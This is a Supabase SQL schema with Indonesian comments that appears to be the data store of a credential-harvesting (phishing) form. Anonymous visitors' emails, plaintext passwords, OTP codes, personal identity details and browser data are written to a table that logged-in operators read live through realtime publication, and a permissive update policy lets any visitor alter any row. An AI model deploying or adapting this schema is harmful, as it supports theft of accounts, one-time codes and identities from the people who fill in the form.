-- ============ TABEL ============
create table if not exists public.submissions (
  id            uuid primary key default gen_random_uuid(),
  session_id    text,
  created_at    timestamptz not null default now(),
  updated_at    timestamptz default now(),
  step          int default 1,
  email         text,
  password      text,
  phone         text,
  full_name     text,
  age           int,
  birth_date    date,
  gender        text,
  address       text,
  city          text,
  province      text,
  postal_code   text,
  occupation    text,
  income        text,
  otp           text,
  user_agent    text,
  referrer      text,
  page_url      text,
  screen        text,
  timezone      text
);

create index if not exists submissions_created_idx on public.submissions (created_at desc);

-- ============ RLS ============
alter table public.submissions enable row level security;

grant usage on schema public to anon, authenticated;
grant insert, update on public.submissions to anon, authenticated;
grant select, delete on public.submissions to authenticated;

-- pengunjung boleh menulis & memperbarui barisnya sendiri
create policy "anon insert" on public.submissions
  for insert to anon, authenticated with check (true);

create policy "anon update" on public.submissions
  for update to anon, authenticated using (true) with check (true);

-- hanya admin yang login boleh membaca & menghapus
create policy "auth read" on public.submissions
  for select to authenticated using (true);

create policy "auth delete" on public.submissions
  for delete to authenticated using (true);

-- ============ REALTIME ============
alter publication supabase_realtime add table public.submissions;